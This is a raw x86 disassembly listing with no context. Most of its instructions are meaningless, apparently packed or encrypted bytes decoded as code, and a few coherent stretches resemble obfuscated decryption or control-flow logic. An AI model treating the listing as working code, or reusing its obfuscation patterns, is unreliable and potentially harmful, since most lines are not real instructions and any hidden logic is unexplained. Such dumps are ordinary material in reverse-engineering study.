  4020d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4020d6:	jns    0x402096
  4020d8:	ds loop 0x4020fe
  4020db:	ret    
  4020dc:	(bad)
  4020e1:	pusha  
  4020e2:	int    0x6c
  4020e4:	daa    
  4020e5:	push   esi
  4020e6:	stc    
  4020e7:	inc    esp
  4020e8:	pusha  
  4020e9:	adc    ah,BYTE PTR [ebx]
  4020eb:	aad    0x87
  4020ed:	adc    BYTE PTR [edi-0x79],cl
  4020f0:	mov    bh,0xcb
  4020f2:	push   es
  4020f3:	xchg   ecx,eax
  4020f4:	mov    dl,0x8
  4020f6:	mov    BYTE PTR [esi],ch
  4020f8:	cmp    esp,DWORD PTR [eax]
  4020fa:	fild   QWORD PTR [eax+0x28]
  4020fd:	ins    BYTE PTR es:[edi],dx
  4020fe:	lea    esi,[esi-0x12]
  402101:	jmp    0x4020ee
  402103:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402104:	jbe    0x402132
  402106:	pop    dx
  402108:	cld    
  402109:	ss mov ah,0x12
  40210c:	adc    esi,ebx
  40210e:	aas    
  40210f:	daa    
  402110:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402111:	ss lock jmp 0x4020eb
  402115:	xor    BYTE PTR [esi+0x57],ch
  402118:	jp     0x4020be
  40211a:	fsubr  QWORD PTR [esi+esi*4]
  40211d:	mov    cl,0x6c
  40211f:	add    dh,dl
  402121:	retf   0x80ca
  402124:	and    DWORD PTR [ebp+0x79c25bc1],0x97f69181
  40212e:	add    eax,DWORD PTR [ecx-0x29]
  402131:	push   ebx
  402132:	xchg   BYTE PTR [ebp+0xe4e6cff],ch
  402138:	jb     0x4020de
  40213a:	sahf   
  40213b:	pop    DWORD PTR [ecx+0x12]
  40213e:	sbb    esp,ebx
  402140:	dec    ebx
  402141:	and    esp,DWORD PTR [esi-0x32a9b7f5]
  402147:	imul   esi,DWORD PTR [eax*4+0x29c34f8b],0x32
  40214f:	js     0x4021a9
  402151:	cmp    esi,ebp
  402153:	sub    al,0xa9
  402155:	sti    
  402156:	push   ss
  402157:	jb     0x40216c
  402159:	push   es
  40215a:	dec    ebx
  40215b:	pop    ss
  40215c:	rol    DWORD PTR [ebx],1
  40215e:	adc    DWORD PTR [edx+0x41046b02],ebp
  402164:	sub    al,0x7e
  402166:	dec    esi
  402167:	out    dx,eax
  402168:	fisub  DWORD PTR [edx+esi*8+0x576f4df4]
  40216f:	mov    bl,0xec
  402171:	xchg   ecx,eax
  402172:	or     dl,BYTE PTR [edx]
  402174:	fnsave [edi-0x6e94d4c4]
  40217a:	push   ecx
  40217b:	jbe    0x40212e
  40217d:	sub    DWORD PTR gs:[eax-0x27],esp
  402181:	enter  0x86ea,0xb0
  402185:	sub    ch,bh
  402187:	xchg   BYTE PTR [edx],dl
  402189:	fsubr  QWORD PTR [ebx]
  40218b:	lea    ebp,[eax+0x67]
  40218e:	pop    ss
  40218f:	xchg   ebx,eax
  402190:	xchg   edi,eax
  402191:	les    eax,FWORD PTR [ecx+0x5c6c3b80]
  402197:	imul   esi,DWORD PTR [ecx+ebx*2+0xb445d4d],0x2f
  40219f:	cmp    dl,BYTE PTR [ecx-0x2740ac93]
  4021a5:	xor    dh,bl
  4021a7:	xchg   DWORD PTR [ebp+ebp*8-0x64379d2f],edx
  4021ae:	inc    esi
  4021af:	in     al,dx
  4021b0:	outs   dx,BYTE PTR ds:[esi]
  4021b1:	popa   
  4021b2:	xchg   ebx,eax
  4021b3:	data16 (bad) 
  4021b5:	mov    ebp,0xf7baf93c
  4021ba:	xchg   bl,cl
  4021bc:	sbb    al,0xbe
  4021be:	adc    dh,BYTE PTR [edi-0x76]
  4021c1:	(bad)  
  4021c2:	mov    es,WORD PTR [ecx+0x52]
  4021c5:	out    0x14,al
  4021c7:	imul   DWORD PTR [ecx-0x70]
  4021ca:	sbb    esp,esi
  4021cc:	dec    eax
  4021cd:	loop   0x4021d5
  4021cf:	mov    esi,0x47398672
  4021d4:	(bad)  
  4021d5:	(bad)  
  4021d6:	loope  0x4021dc
  4021d8:	xor    eax,0x2d75e1af
  4021dd:	pop    es
  4021de:	out    0xee,eax
  4021e0:	jns    0x4021c1
  4021e2:	ret    
  4021e3:	cdq    
  4021e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4021e5:	popa   
  4021e6:	add    eax,0x3c44396d
  4021eb:	sub    al,BYTE PTR [edx+ecx*2+0x65]
  4021ef:	push   cs
  4021f0:	jmp    0xe5c7a230
  4021f5:	nop
  4021f6:	mov    bl,0x23
  4021f8:	xchg   esi,eax
  4021f9:	mov    BYTE PTR [ecx+0x161dc3ea],0x98
  402200:	mov    ds:0xbd4853f8,al
  402205:	xchg   ebp,eax
  402206:	sub    al,0x16
  402208:	jle    0x40224c
  40220a:	sub    al,0x6d
  40220c:	in     eax,dx
  40220d:	cld    
  40220e:	sub    dl,al
  402210:	lahf   
  402211:	retf   
  402212:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402213:	(bad)  
  402214:	xor    bl,ch
  402216:	sbb    eax,0xdff262f3
  40221b:	xor    eax,0x7d800186
  402220:	sbb    eax,0x2707b896
  402225:	shl    DWORD PTR [esi+0x73],cl
  402228:	mov    ebp,0x1a5e38b9
  40222d:	dec    edx
  40222e:	mov    ebp,0x84710ea4
  402233:	cld    
  402234:	inc    esi
  402235:	jno    0x402250
  402237:	or     bh,ah
  402239:	push   edi
  40223a:	add    edx,DWORD PTR [esi-0x3ac9da10]
  402240:	jmp    0x4022af
  402242:	fisubr WORD PTR ds:[ebx]
  402245:	mov    dh,0x3f
  402247:	nop
  402248:	push   eax
  402249:	outs   dx,BYTE PTR ds:[esi]
  40224a:	add    DWORD PTR [eax],ebp
  40224c:	pop    ebx
  40224d:	push   0x85b378ef
  402252:	clc    
  402253:	mov    bh,0x8f
  402255:	jno    0x4022ca
  402257:	jmp    0x6a70:0x2a31aa7a
  40225e:	cmc    
  40225f:	mov    esi,0x1c865f9e
  402264:	sub    al,0xe0
  402266:	mov    esp,0x60176091
  40226b:	daa    
  40226c:	add    BYTE PTR [ebx-0x679b9259],0xa
  402273:	test   eax,0x840f7a9c
  402278:	add    DWORD PTR [eax+eax*1],0xec458b00
  40227f:	xor    eax,ecx
  402281:	add    eax,esi
  402283:	mov    DWORD PTR [ebp-0x30],eax
  402286:	mov    eax,DWORD PTR [ebp-0x34]
  402289:	jmp    0x4024a6
  40228e:	jp     0x40222b
  402290:	sbb    al,0xe8
  402292:	cdq    
  402293:	ja     0x402267
  402295:	jno    0x40227a
  402297:	sbb    al,0x20
  402299:	sub    ebp,edx
  40229b:	pop    edx
  40229c:	mov    eax,0x7002704e
  4022a1:	jo     0x402313
  4022a3:	jle    0x402315
  4022a5:	jo     0x402326
  4022a7:	mov    ebp,0xf69f3354
  4022ac:	push   ecx
  4022ad:	xor    ch,BYTE PTR [eax+0x77]
  4022b0:	inc    ebp
  4022b1:	call   FWORD PTR [esi-0x6a12df72]
  4022b7:	pushf  
  4022b8:	clc    
  4022b9:	arpl   di,sp
  4022bb:	xor    esi,DWORD PTR [esi]
  4022bd:	das    
  4022be:	fild   DWORD PTR [esi+0x61]
  4022c1:	dec    ebp
  4022c2:	lds    esp,FWORD PTR [ecx+0x5d]
  4022c5:	add    DWORD PTR [edx+0x15],esi
  4022c8:	sbb    al,0x8a
  4022ca:	push   cs
  4022cb:	dec    ecx
  4022cc:	add    ebx,DWORD PTR ds:0xb58d8e61
  4022d2:	pop    ecx
  4022d3:	inc    ecx
  4022d4:	dec    ebp
  4022d5:	aaa    
  4022d6:	pop    ss
  4022d7:	and    eax,esp
  4022d9:	mov    al,0x2e
  4022db:	pop    ecx
  4022dc:	and    ax,0x1c04
  4022e0:	and    DWORD PTR [ecx+edi*8],esp
  4022e3:	or     esp,DWORD PTR [eax]
  4022e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4022e6:	add    eax,0x7353693f
  4022eb:	jge    0x40234d
  4022ed:	mov    cl,cl
  4022ef:	fmul   DWORD PTR [ebx-0x22]
  4022f2:	mov    al,0xaf
  4022f4:	cmp    al,0x80
  4022f6:	sub    cl,BYTE PTR [ecx-0xacba8fd]
  4022fc:	dec    esi
  4022fd:	xor    DWORD PTR [edi-0x18402136],ebp
  402303:	fwait
  402304:	inc    esp
  402305:	into   
  402306:	shl    BYTE PTR [esi+0x30],cl
  402309:	ret    0x9fd8
  40230c:	cmp    eax,DWORD PTR [eax+0x14]
  40230f:	sbb    bl,BYTE PTR [edi+0x68815193]
  402315:	or     ebp,DWORD PTR [esi+0x5c]
  402318:	push   0xfffffffc
  40231a:	xchg   edx,eax
  40231b:	ins    DWORD PTR es:[edi],dx
  40231c:	pop    es
  40231d:	addr16 hlt 
  40231f:	iret   
  402320:	push   eax
  402321:	push   cs
  402322:	popf   
  402323:	aad    0xbd
  402325:	xchg   edi,eax
  402326:	pop    ecx
  402327:	(bad)  
  402328:	sbb    ecx,esp
  40232a:	cld    
  40232b:	rol    cl,cl
  40232d:	adc    eax,0x1916ac4b
  402332:	mov    bl,0x94
  402334:	lea    eax,[eax+0x57]
  402337:	jg     0x402307
  402339:	adc    ecx,edx
  40233b:	xchg   edx,eax
  40233c:	mov    esp,0x9c690c6a
  402341:	xchg   ebx,eax
  402342:	adc    esp,DWORD PTR [edi+0x71]
  402345:	(bad)  
  402346:	sahf   
  402347:	dec    esi
  402348:	fisubr WORD PTR [eax-0x80]
  40234b:	call   0x2fc41dc2
  402350:	xor    BYTE PTR [edx-0x28],al
  402353:	lods   al,BYTE PTR ds:[esi]
  402354:	adc    DWORD PTR [eax-0x66],ebx
  402357:	ror    ch,cl
  402359:	and    eax,0x595e6306
  40235e:	inc    eax
  40235f:	out    0x36,eax
  402361:	xor    al,0x9
  402363:	adc    eax,DWORD PTR [ecx+0x8]
  402366:	sbb    DWORD PTR [ebx],ecx
  402368:	add    al,BYTE PTR [esi]
  40236a:	mov    edx,0xc1acbae0
  40236f:	nop
  402370:	ds leave 
  402372:	xor    BYTE PTR [ecx-0x6d],bh
  402375:	xchg   esp,eax
  402376:	mov    dl,cl
  402378:	mov    edx,0x3fd57b70
  40237d:	dec    edi
  40237e:	add    dl,al
  402380:	loope  0x4023dd
  402382:	xor    al,0x63
  402384:	jp     0x402316
  402386:	in     al,0xea
  402388:	imul   edi,DWORD PTR [ebp-0x3bc9d19d],0x6152ead3
  402392:	dec    ecx
  402393:	or     BYTE PTR [eax-0x34],ah
  402396:	nop
  402397:	mov    eax,fs:0x927e77f8
  40239d:	das    
  40239e:	pop    esi
  40239f:	and    bh,al
  4023a1:	cwde   
  4023a2:	and    eax,0x1eb29c8b
  4023a7:	and    al,0x96
  4023a9:	mov    fs,WORD PTR [edi-0x2a]
  4023ac:	rcr    DWORD PTR [edx-0x1f],0x85
  4023b0:	cmc    
  4023b1:	and    eax,0x98e89e48
  4023b6:	and    DWORD PTR [edx+0x61fb48f3],ebp
  4023bc:	fadd   QWORD PTR [edi]
  4023be:	(bad)  
  4023c0:	(bad)  
  4023c1:	faddp  st(2),st
  4023c3:	loope  0x402434
  4023c5:	je     0x4023b9
  4023c7:	dec    esp
  4023c8:	mov    BYTE PTR [ebx+0x7abe5842],bl
  4023ce:	xchg   edi,eax
  4023cf:	ror    DWORD PTR [eax+ebp*1+0x3e],1
  4023d3:	push   eax
  4023d4:	mov    dh,al
  4023d6:	and    bh,bh
  4023d8:	cmp    DWORD PTR [ecx-0x30],esp
  4023db:	outs   dx,DWORD PTR ds:[esi]
  4023dc:	outs   dx,DWORD PTR ds:[esi]
  4023dd:	adc    eax,0xcefac98
  4023e2:	ins    BYTE PTR es:[edi],dx
  4023e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4023e4:	test   eax,0xbe8c2258
  4023e9:	pop    ebp
  4023ea:	xchg   DWORD PTR [edx],edi
  4023ec:	push   esi
  4023ed:	call   0xd2151594
  4023f2:	pop    edi
  4023f3:	sbb    ecx,DWORD PTR [ecx]
  4023f5:	mov    ch,0xe9
  4023f7:	test   BYTE PTR [ebx-0x1d],cl
  4023fa:	jmp    0x613a0221
  4023ff:	xor    edi,DWORD PTR [ebx+0x6e0885fd]
  402405:	cdq    
  402406:	and    BYTE PTR [esi],dh
  402408:	mov    bl,0xb8
  40240a:	cmp    dl,cl
  40240c:	test   eax,0x701ced03
  402411:	cs sub eax,0x7a5fa490
  402417:	sbb    BYTE PTR [eax+ecx*1],al
  40241a:	inc    di
  40241c:	xchg   BYTE PTR [ecx],ch
  40241e:	adc    DWORD PTR [eax],eax
  402420:	ss push ss
  402422:	out    0x61,eax
  402424:	imul   eax,DWORD PTR [ebx+0x3c55c1b2],0xd5f7b8a9
  40242e:	pop    edx
  402430:	mov    edx,0x422f505b
  402435:	popf   
  402436:	mov    bh,0x21
  402438:	mov    WORD PTR [eax+0x1d],ss
  40243b:	mov    edx,0x901aaeab
  402440:	cdq    
  402441:	lods   eax,DWORD PTR ds:[esi]
  402442:	xchg   esp,eax
  402443:	inc    edi
  402444:	aas    
  402445:	iret   
  402446:	sbb    eax,0xe8f4caac
  40244b:	mov    ecx,0xa7ff01dc
  402450:	mov    dl,0x71
  402452:	xchg   DWORD PTR [edi],esp
  402454:	push   ss
  402455:	es xor eax,0xdabcc32f
  40245b:	test   eax,0x3abf019b
  402460:	push   edi
  402461:	add    al,0x1a
  402463:	dec    ecx
  402464:	cmp    edi,DWORD PTR [ecx+0x7ce8c2e9]
  40246a:	(bad)  
  40246b:	fdivr  DWORD PTR [ecx-0x44a19035]
  402471:	rcl    BYTE PTR [eax],1
  402473:	xchg   edx,eax
  402474:	xor    BYTE PTR [ecx-0x29],dh
  402477:	and    BYTE PTR [edi-0x50ebd429],dl
  40247d:	fsub   DWORD PTR [edi+0x8]
  402480:	std    
  402481:	repnz fst QWORD PTR [ecx]
  402484:	adc    eax,0x7743a5cd
  402489:	pop    ds
  40248a:	mov    esi,0x64ef7d9f
  40248f:	sub    DWORD PTR [esi],esp
  402491:	rcr    DWORD PTR [eax+0x4c],1
  402494:	sub    eax,0x334a7a6a
  402499:	dec    eax
  40249a:	push   ebp
  40249b:	push   eax
  40249c:	ret    
  40249d:	and    eax,DWORD PTR [ebx-0xb7e79d9]
  4024a3:	or     eax,0x8b662e5e
  4024a8:	push   ebp
  4024a9:	enter  0x3ebb,0x8a
  4024ad:	add    BYTE PTR [eax],al
  4024af:	xor    dx,bx
  4024b2:	mov    ebx,DWORD PTR [ebp-0x8]
  4024b5:	add    dx,di
  4024b8:	movzx  edx,dx
  4024bb:	xor    ebx,ecx
  4024bd:	lea    edx,[edx+ebx*1+0x32729c]
  4024c4:	add    DWORD PTR [eax],edx
  4024c6:	mov    eax,DWORD PTR [ebp-0x2c]
  4024c9:	mov    edx,DWORD PTR [ebp-0x8]
  4024cc:	mov    ebx,DWORD PTR [ebp-0x30]
  4024cf:	xor    edx,ecx
  4024d1:	add    edx,esi
  4024d3:	imul   edx,ebx
  4024d6:	sub    DWORD PTR [eax],edx
  4024d8:	mov    eax,DWORD PTR [ebp-0x14]
  4024db:	jmp    0x402730
  4024e0:	jmp    0x4026fd
  4024e5:	and    DWORD PTR [edi+edi*4+0x31714d76],esi
  4024ec:	jae    0x40250e
  4024ee:	xor    BYTE PTR [ecx-0x5f9e7c9],cl
  4024f4:	iret   
  4024f5:	jo     0x4024f7
  4024f7:	jo     0x402569
  4024f9:	jo     0x402579
  4024fb:	jo     0x40256d
  4024fd:	xchg   esi,eax
  4024fe:	data16 adc BYTE PTR [edi+0x7f14f570],bh
  402505:	pcmpgtb mm7,QWORD PTR [ecx]
  402508:	dec    ebx
  402509:	(bad)  
  40250a:	jle    0x4024dd
  40250c:	pop    dx
  40250e:	xor    al,0x53
  402510:	adc    BYTE PTR [esi+edx*4-0x3a],dl
  402514:	loope  0x402568
  402516:	add    eax,0x31c52178
  40251b:	mov    ebp,ss
  40251d:	dec    eax
  40251e:	inc    ebp
  40251f:	pop    ecx
  402520:	cwde   
  402521:	push   cs
  402522:	pushf  
  402523:	cmc    
  402524:	pop    edi
  402525:	jl     0x4024f5
  402527:	sub    eax,0xd32be839
  40252c:	xchg   ebp,eax
  40252d:	sub    ch,BYTE PTR [ecx+0x4d]
  402530:	add    al,0x4a
  402532:	dec    esi
  402533:	mov    edi,0x89e77ef5
  402538:	xchg   edx,eax
  402539:	push   esi
  40253a:	jo     0x402582
  40253c:	loope  0x4024fc
  40253e:	mov    ds:0x89ddead9,al
  402543:	cmp    esp,DWORD PTR [ecx+0x69]
  402546:	fiadd  WORD PTR [ecx]
  402548:	(bad)  
  402549:	push   ds
  40254a:	cld    
  40254b:	jne    0x4024dc
  40254d:	sub    DWORD PTR [edi],esi
  40254f:	ror    BYTE PTR [edx+0x78fd664c],0x48
  402556:	pop    ebp
  402557:	ret    
  402558:	fisttp WORD PTR [ebp-0x40422ee2]
  40255e:	mov    bh,bh
  402560:	out    dx,eax
  402561:	lock cdq 
  402563:	repz dec ecx
  402565:	out    0x8e,eax
  402567:	sub    DWORD PTR [edi-0x2f98854f],edi
  40256d:	gs inc edx
  40256f:	cmp    eax,0x2c6c678c
  402574:	stos   BYTE PTR es:[edi],al
  402575:	cmp    al,0x5a
  402577:	xor    BYTE PTR [eax-0x53fdade3],ch
  40257d:	outs   dx,BYTE PTR ds:[esi]
  40257e:	fisttp DWORD PTR [esi-0x23dc94cc]
  402584:	dec    ebx
  402585:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402586:	icebp  
  402587:	ins    DWORD PTR es:[edi],dx
  402588:	imul   ebx,DWORD PTR [eax+eax*2],0x1e4b1501
  40258f:	scas   al,BYTE PTR es:[edi]
  402590:	sub    eax,0x73e5cad5
  402595:	out    dx,eax
  402596:	fmulp  st(0),st
  402598:	adc    DWORD PTR [ecx],edi
  40259a:	nop
  40259b:	mov    ds:0xd67be664,eax
  4025a0:	jge    0x402538
  4025a2:	dec    esi
  4025a3:	pop    ss
  4025a4:	call   DWORD PTR [edi]
  4025a6:	jl     0x40258d
  4025a8:	pop    edx
  4025a9:	jbe    0x4025a9
  4025ab:	inc    edi
  4025ac:	or     dh,BYTE PTR ds:[ebx]
  4025af:	push   edx
  4025b0:	mov    ecx,0x3174d088
  4025b5:	inc    esp
  4025b6:	aaa    
  4025b7:	fbld   TBYTE PTR [edi]
  4025b9:	sbb    DWORD PTR [edx+0x36],0xffffffc5
  4025bd:	ror    DWORD PTR [ebx+0x1740f40e],1
  4025c3:	sub    DWORD PTR [edx-0x4a],esi
  4025c6:	push   eax
  4025c7:	mov    cl,0xea
  4025c9:	int    0xfc
  4025cb:	lods   al,BYTE PTR ds:[esi]
  4025cc:	xor    al,0xe0
  4025ce:	int    0xb4
  4025d0:	fcomp  DWORD PTR [ecx]
  4025d2:	cmp    DWORD PTR [edi+0x1e605473],esi
  4025d8:	fcomp  st(5)
  4025da:	pusha  
  4025db:	jmp    0xb3dbf79c
  4025e0:	sbb    bl,BYTE PTR [ecx+0x63e7f399]
  4025e6:	out    dx,al
  4025e7:	imul   eax,DWORD PTR [ecx-0x2333d2d6],0xffffff97
  4025ee:	mov    ch,0x1a
  4025f0:	fisttp WORD PTR [eax+0x7a]
  4025f3:	in     eax,0xc6
  4025f5:	mov    eax,ds:0xc09e6859
  4025fa:	and    DWORD PTR [ebp+0x3a],ebx
  4025fd:	mov    cl,0xcd
  4025ff:	mov    cs,ebx
  402601:	cs adc eax,0x3ee9f016
  402607:	(bad)  
  402608:	fidivr WORD PTR [eax+0x3]
  40260b:	add    al,0xe
  40260d:	fisub  DWORD PTR [ecx]
  40260f:	test   edi,edx
  402611:	ret    0x918d
  402614:	inc    edx
  402615:	ja     0x402661
  402617:	jno    0x402622
  402619:	ja     0x402681
  40261b:	sub    al,0x35
  40261d:	sub    bl,0xb6
  402620:	neg    esp
  402622:	sub    edx,ebx
  402624:	add    DWORD PTR [edi+0x4445b807],esi
  40262a:	fidiv  DWORD PTR ds:0xaf7b62f9
  402630:	adc    al,0xe9
  402632:	sahf   
  402633:	scas   eax,DWORD PTR es:[edi]
  402634:	rol    BYTE PTR [edx+0x7470ae1],cl
  40263a:	sahf   
  40263b:	sbb    eax,0xb1d75a75
  402640:	mov    al,dl
  402642:	ror    edi,cl
  402644:	stos   BYTE PTR es:[edi],al
  402645:	cdq    
  402646:	ret    
  402647:	adc    BYTE PTR [ebx-0x30],bl
  40264a:	pop    edx
  40264b:	shl    DWORD PTR [ecx+0x74],1
  40264e:	jge    0x4026a2
  402650:	shl    DWORD PTR [ebp-0x7],cl
  402653:	jle    0x402646
  402655:	push   esi
  402656:	das    
  402657:	into   
  402658:	jle    0x402610
  40265a:	outs   dx,BYTE PTR ds:[esi]
  40265b:	cmp    BYTE PTR [esi+0x6fdf7c94],ch
  402661:	pop    ebp
  402662:	adc    DWORD PTR [eax],ebp
  402664:	ror    BYTE PTR [ebp+0xacc18e7],1
  40266a:	jp     0x40267b
  40266c:	aad    0x6c
  40266e:	inc    edx
  40266f:	(bad)  
  402670:	call   FWORD PTR ds:0xc50c36ac
  402676:	fs inc ebp
  402678:	scas   al,BYTE PTR es:[edi]
  402679:	cmp    esi,DWORD PTR [eax+0x7f53d110]
  40267f:	push   ebp
  402680:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402681:	shl    BYTE PTR [esi+0x1acd552a],cl
  402687:	lock ss cmp eax,0x9cb455b6
  40268e:	call   0xa42d975c
  402693:	fild   QWORD PTR [ebx-0x703af35d]
  402699:	or     BYTE PTR [ebx-0x66],ah
  40269c:	rcr    DWORD PTR [edx-0x6],1
  40269f:	in     al,dx
  4026a0:	(bad)  
  4026a1:	ins    DWORD PTR es:[edi],dx
  4026a2:	push   ebp
  4026a3:	adc    eax,0xcc702cb3
  4026a8:	or     dh,BYTE PTR [ebx]
  4026aa:	sbb    esp,DWORD PTR [ebx]
  4026ac:	imul   esi
  4026ae:	and    ch,BYTE PTR [edi+0x4]
  4026b1:	dec    ebp
  4026b2:	loopne 0x40264e
  4026b4:	inc    BYTE PTR [edi]
  4026b6:	clc    
  4026b7:	jnp    0x402689
  4026b9:	out    dx,al
  4026ba:	push   cs
  4026bb:	adc    al,0x6e
  4026bd:	mov    esp,0x75512d39
  4026c2:	(bad)  
  4026c3:	pop    es
  4026c4:	push   0xffffff87
  4026c6:	sub    eax,0xc63ffde3
  4026cb:	mov    ds:0x8b104926,eax
  4026d0:	stos   BYTE PTR es:[edi],al
  4026d1:	sbb    eax,0xff061485
  4026d6:	push   ds
  4026d7:	retf   
  4026d8:	ror    bl,cl
  4026da:	lock inc edx
  4026dc:	xor    dh,cl
  4026de:	and    esi,DWORD PTR [esi-0x49609c1c]
  4026e4:	push   cs
  4026e5:	jg     0x40273a
  4026e7:	inc    ecx
  4026e8:	and    DWORD PTR [eax],edx
  4026ea:	or     al,0x99
  4026ec:	leave  
  4026ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4026ee:	adc    eax,0xf889bf1f
  4026f3:	out    0x7d,al
  4026f5:	add    eax,0x6f0fed8
  4026fa:	fnsetpm(287 only) 
  4026fc:	mov    al,0x8b
  4026fe:	inc    ebp
  4026ff:	hlt    
  402700:	mov    edx,DWORD PTR [ebp-0x18]
  402703:	xor    eax,edx
  402705:	cmp    eax,0x8cb40b7d
  40270a:	je     0x40272d
  402710:	mov    eax,DWORD PTR [ebp-0x10]
  402713:	add    DWORD PTR [eax],0x7403501
  402719:	jmp    0x40272d
  40271e:	mov    eax,DWORD PTR [ebp-0x1c]
  402721:	cmp    DWORD PTR [eax],0xf89f2da9
  402727:	jne    0x402748
  40272d:	mov    eax,DWORD PTR [ebp-0x8]
  402730:	xor    eax,ecx
  402732:	add    eax,esi
  402734:	test   eax,eax
  402736:	jne    0x402748
  40273c:	xor    DWORD PTR [ebp-0x20],0xe149ebe
  402743:	jmp    0x4012bf
  402748:	pop    ebx
  402749:	pop    edi
  40274a:	jmp    0x402967
  40274f:	cs dec edi
  402751:	add    dl,bl
  402753:	popa   
  402754:	push   ecx
  402755:	in     eax,dx
  402756:	jno    0x4026ea
  402758:	imul   ebx,DWORD PTR [ecx+esi*8],0xeef507b5
  40275f:	jo     0x40276f
  402761:	jo     0x4027d3
  402763:	jo     0x4027e3
  402765:	jo     0x4027d7
  402767:	shl    eax,1
  402769:	sbb    ebp,edi
  40276b:	fist   WORD PTR [ebp-0x3b82f918]
  402771:	xor    ebp,DWORD PTR [eax]
  402773:	adc    ebp,ebx
  402775:	(bad)  
  402776:	cmp    edi,ebp
  402778:	jno    0x4027d5
  40277a:	dec    edi
  40277b:	call   0x9cd7:0xecaac6e4
  402782:	lods   al,BYTE PTR ds:[esi]
  402783:	out    0x89,eax
  402785:	sub    BYTE PTR [edx-0x5c],cl
  402788:	sar    BYTE PTR ds:0x29fc15ae,0x73
  40278f:	js     0x402767
  402791:	mov    ecx,0x94c46ef
  402796:	out    0x98,al
  402798:	add    eax,0xf4481224
  40279d:	xor    DWORD PTR [edx+0x227e4464],ebx
  4027a3:	dec    edi
  4027a4:	ja     0x402746
  4027a6:	sbb    BYTE PTR [ecx+0x4530c349],dl
  4027ac:	mov    dl,0x8a
  4027ae:	into   
  4027af:	sub    eax,0xc4614103
  4027b4:	aad    0xa5
  4027b6:	test   al,0x99
  4027b8:	out    0xdc,eax
  4027ba:	cwde   
  4027bb:	or     eax,0xb8737683
  4027c0:	push   ss
  4027c1:	and    eax,0x34fca74f
  4027c6:	pushf  
  4027c7:	sbb    bl,BYTE PTR [eax-0x3b33054a]
  4027cd:	push   cs
  4027ce:	pop    es
  4027cf:	imul   edi,DWORD PTR [edx+edi*4-0x674a20e6],0x24e65da2
  4027da:	in     eax,dx
  4027db:	sub    ebx,DWORD PTR [ebx]
  4027dd:	xor    edi,DWORD PTR [edi+edx*2+0x5d]
  4027e1:	sub    ebx,DWORD PTR [ebp+0x63]
  4027e4:	jne    0x402837
  4027e6:	in     eax,dx
  4027e7:	mov    ch,0x2
  4027e9:	dec    esi
  4027ea:	mov    ebp,0x824bd808
  4027ef:	sub    al,0x25
  4027f1:	cmp    edx,DWORD PTR [eax]
  4027f3:	xor    bl,BYTE PTR [edi+0x5c88f604]
  4027f9:	push   ebp
  4027fa:	dec    ecx
  4027fb:	ss mov ecx,ecx
  4027fe:	retf   0x3434
  402801:	jmp    0x3388f219
  402806:	push   0xffffffcf
  402808:	dec    esi
  402809:	push   eax
  40280a:	jge    0x4027be
  40280c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40280d:	scas   al,BYTE PTR es:[edi]
  40280e:	clc    
  40280f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402810:	loop   0x40280f
  402812:	loopne 0x40286e
  402814:	stos   DWORD PTR es:[edi],eax
  402815:	sahf   
  402816:	or     eax,0xed89fc74
  40281b:	mov    eax,0xd737d0b3
  402820:	and    al,0xbf
  402822:	clc    
  402823:	js     0x4027b0
  402825:	pop    ss
  402826:	sbb    DWORD PTR [edx+0x51a4426d],ecx
  40282c:	and    bh,BYTE PTR [eax]
  40282e:	push   cs
  40282f:	std    
  402830:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402831:	mov    bh,0x70
  402833:	fcom   QWORD PTR [ebp+0x7d]
  402836:	mov    dh,0x1
  402838:	ss ss retf 
  40283b:	(bad)  
  40283c:	jmp    0x402861
  40283e:	or     BYTE PTR [esi+0x36],0xd7
  402842:	ret    
  402843:	loope  0x402843
  402845:	loop   0x402884
  402847:	or     al,0x5b
  402849:	sbb    esi,eax
  40284b:	inc    ebx
  40284c:	push   es
  40284d:	jae    0x4027e8
  40284f:	mov    edi,DWORD PTR [edi]
  402851:	xchg   edx,eax
  402852:	cdq    
  402853:	dec    ebx
  402854:	loop   0x402811
  402856:	fwait
  402857:	mov    al,ds:0xe060c430
  40285c:	popf   
  40285d:	pop    esp
  40285e:	retf   0x5753
  402861:	push   edi
  402862:	pop    ebp
  402863:	add    al,0xf1
  402865:	rol    DWORD PTR [ecx],1
  402867:	stos   DWORD PTR es:[edi],eax
  402868:	cmp    BYTE PTR [ebp-0x22],0x15
  40286c:	add    dl,BYTE PTR [ebp-0x239e8938]
  402872:	mov    ah,0x5d
  402874:	retf   0xfb7c
  402877:	push   ebx
  402878:	or     BYTE PTR [edx],bh
  40287a:	sbb    ecx,edi
  40287c:	fisttp QWORD PTR [ebx+0xb]
  40287f:	popf   
  402880:	add    DWORD PTR ds:0x2fcf11b2,edx
  402886:	sbb    al,ch
  402888:	or     al,0x8a
  40288a:	test   DWORD PTR [edx],esp
  40288c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40288d:	sar    edx,cl
  40288f:	outs   dx,BYTE PTR ds:[esi]
  402890:	pop    edx
  402891:	out    0x50,al
  402893:	ds push 0x5e
  402896:	popf   
  402897:	cvtdq2ps xmm2,XMMWORD PTR [ebp-0x143c710e]
  40289e:	pusha  
  40289f:	clc    
  4028a0:	xor    al,0x19
  4028a2:	rcr    BYTE PTR [ebp+edi*4-0x4fcbbb51],0xbe
  4028aa:	jmp    DWORD PTR [ecx]
  4028ac:	mov    ch,0x27
  4028ae:	out    0x3f,eax
  4028b0:	push   ebp
  4028b1:	int3   
  4028b2:	xcrypt-cbc (bad)
  4028b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4028b4:	adc    bl,ch
  4028b6:	cdq    
  4028b7:	pop    ebx
  4028b8:	test   BYTE PTR [eax-0x26198af6],bl
  4028be:	shl    ah,0xfa
  4028c1:	outs   dx,DWORD PTR ds:[esi]
  4028c2:	pusha  
